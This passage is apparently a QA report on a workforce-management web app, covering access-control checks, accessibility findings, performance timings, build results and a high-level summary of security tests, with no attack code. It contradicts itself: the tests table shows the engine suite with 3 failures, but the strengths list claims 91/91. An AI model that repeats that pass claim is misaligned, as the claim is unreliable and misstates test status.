| --- | ---: | ---: | ---: | ---: | --- |
| Signed out | 327 | 0 | — | — | ✅ Pass |
| WFM_MANAGER | 168 | 0 | 0 | 0 | ✅ Pass |
| FORECAST_PLANNER | 282 | 0 | 0 | 0 | ✅ Pass |
| SCHEDULER | 250 | 0 | 0 | 0 | ✅ Pass |
| SUPERVISOR_RTA | 297 | 0 | 0 | 0 | ✅ Pass |
| ANALYST | 300 | 0 | 0 | 0 | ✅ Pass |
| AGENT | 310 | 0 | 0 | 0 | ✅ Pass |

## Accessibility (axe-core, WCAG 2.1 A + AA)

| Rule | Impact | Screens | Elements | Meaning |
| --- | --- | ---: | ---: | --- |
| label | critical | 1/51 | 6 | Form elements must have labels |
| color-contrast | serious | 51/51 | 457 | Elements must meet minimum color contrast ratio thresholds |
| dlitem | serious | 1/51 | 10 | <dt> and <dd> elements must be contained by a <dl> |
| definition-list | serious | 1/51 | 1 | <dl> elements must only directly contain properly-ordered <dt> and <dd> groups, <script>, <template> or <div> elements |
| scrollable-region-focusable | serious | 1/51 | 1 | Scrollable region must have keyboard access |

Keyboard: the admin sidebar is now reachable with Tab (DEF-05 fixed).

## Performance (one machine, dev servers — indicative)

### API reads (15 calls each)

| Endpoint | p50 | p95 | Size |
| --- | ---: | ---: | ---: |
| /auth/me | 4 ms | 5 ms | 1 kB |
| /config/groups | 9 ms | 13 ms | 49 kB |
| /workforce/employees | 641 ms | 714 ms | 1620 kB |
| /scheduling/versions | 19 ms | 27 ms | 508 kB |
| /scheduling/versions/:id/shifts | 13 ms | 31 ms | 169 kB |
| /forecast/versions | 7 ms | 12 ms | 27 kB |
| /intraday/coverage?groupId=:group | 33 ms | 58 ms | 25 kB |
| /intraday/adherence?groupId=:group | 1913 ms | 2232 ms | 14 kB |
| /audit | 7 ms | 60 ms | 53 kB |
| /me/home | 13 ms | 53 ms | 1 kB |
| /me/schedule | 10 ms | 11 ms | 8 kB |
| /me/time-off | 8 ms | 14 ms | 5 kB |

### Page load

| Screen | First paint | All data loaded | API calls |
| --- | ---: | ---: | ---: |
| /overview | 821 ms | 2.3 s | 20 |
| /workforce/employees | 369 ms | 6.6 s | 18 |
| /forecasting/forecast-dashboard | 352 ms | 1.1 s | 8 |
| /forecasting/forecast-builder | 261 ms | 6.6 s | 18 |
| /scheduling/schedule-timeline | 269 ms | 1.7 s | 14 |
| /intraday/live-coverage | 282 ms | 1.4 s | 10 |
| /forecasting/accuracy-heatmap | 413 ms | 1.4 s | 12 |

### Concurrency (25 parallel × 4 waves)

| Endpoint | Requests | Req/s | p50 | p95 | Status codes |
| --- | ---: | ---: | ---: | ---: | --- |
| /workforce/employees | 100 | 1 | 14997 ms | 20616 ms | {"200":100} |
| /config/groups | 100 | 94 | 187 ms | 297 ms | {"200":100} |
| /scheduling/versions | 100 | 41 | 374 ms | 756 ms | {"200":100} |
| POST /auth/login x10 concurrent | 10 | — | — | 4390 ms | {"200":10} |

### Phone layout (412 px)

| App | Content width | Sidebar | Result |
| --- | ---: | ---: | --- |
| Employee portal | 412 px | 0 px | ✅ Usable |
| Admin app | 172 px | 240 px | ❌ Squeezed |

## Builds and the project's own tests

| Check | Result | Detail |
| --- | --- | --- |
| TypeScript — admin web app | ✅ Pass | 0 errors |
| TypeScript — employee portal | ✅ Pass | 0 errors |
| TypeScript — gateway | ✅ Pass | 0 errors |
| Production build — admin | ✅ Pass | 281.82 kB / gzip 87.45 kB entry chunk; 35 lazy chunks, AG Grid 2.7 MB loads only on grid screens |
| Production build — portal | ✅ Pass | 282.32 kB / gzip 85.50 kB |
| Secrets scan of both bundles | ✅ Pass | No keys, connection strings or passwords; JWT_SECRET appears only as help text |
| Engine unit tests (pytest) | ❌ Fail | 88 passed, 3 failed (DEF-45) in 7 min |
| Gateway's own API suite (75 files, first run only) | ❌ Fail | 580/683 passed, 77 failed, 20 cancelled · 6 min. Not a clean signal: it shares the dev database and gateway (its README asks for an empty database on :4001 with FORCE_PASSWORD_CHANGE=false); failures are mostly test users stopped by the forced password change, the engine crash (DEF-14), and knock-on failures. Re-run it in CI on an empty database before release. |

## What works well

- Role-based access control: 1,934 role × route checks over 327 guarded routes and 6 roles — no route answered without its permission, no role wrongly blocked, every guarded route returns 401 when signed out.
- Token security: alg:none, role-swapped payload, bad signature, expired and garbage tokens all rejected; sign-out revokes the token server-side.
- Brute force: sign-in locks after 10 failures per IP+user; password change locks after 5; password policy rejects short, common, username-based and repeated-character passwords.
- Injection: SQL-injection probes on sign-in, search and IDs gave no 5xx and no bypass; HTML in names and reasons renders as text (no dangerouslySetInnerHTML anywhere).
- Tenant/employee isolation: an agent cannot see, cancel or give away another agent's requests or shifts; mass-assignment fields are ignored.
- Validation is strong across configuration (duplicates, time zones, SL > 100 %, queue hours), templates, forecast lifecycle (no publish before approve, no deleting a published forecast) and live feeds (negative volume, future events, unknown agents).
- Scheduling quality: published 2-week schedule (282 shifts, 30 people) has 0 double-bookings, ≥ 11 h rest everywhere, ≤ 48 h/week, ≤ 6 days in a row; swap takes are refused when they would break rest/hours rules.
- Self-service flows work end-to-end in the portal: forced first-login password change, time off (auto-approval by policy, overlap check), giveaways, VTO accept, overtime decline, inbox, sign-out.
- API reads are fast (most 4–55 ms p95) and returned no 5xx under 25-way concurrency.
- Headers: Helmet CSP, HSTS, X-Frame-Options, nosniff, no X-Powered-By; CORS allows only the admin origin.
- Builds and checks: TypeScript clean in admin, portal and gateway; both production builds succeed; no secrets in the bundles; engine unit suite 91/91.

## Method and limits

**Covered:** manual and exploratory review of every screen in Chrome; automated UI (Playwright + Chrome): 51-screen crawl, admin and portal journeys, phone layout; API functional checks per module, role-based access over every guarded route, attack tests; route inventory and permission map generated from the gateway source; performance baseline, production builds, type checks, the engine's and the gateway's own suites.

**Not covered:** a second tenant (cross-tenant isolation), single sign-on, SCIM, e-mail/SMS delivery, webhooks, the native mobile app, production infrastructure (TLS, proxy, backups), load beyond 25 concurrent requests, browsers other than Chrome, a screen-reader walkthrough.

**Re-run:**

```powershell
cd qa
npm install
$env:QA_ADMIN_PASSWORD='…'          # test stack only — the suite creates QA- data
npx playwright test
node tools/build-report.mjs
node tools/build-markdown.mjs
```
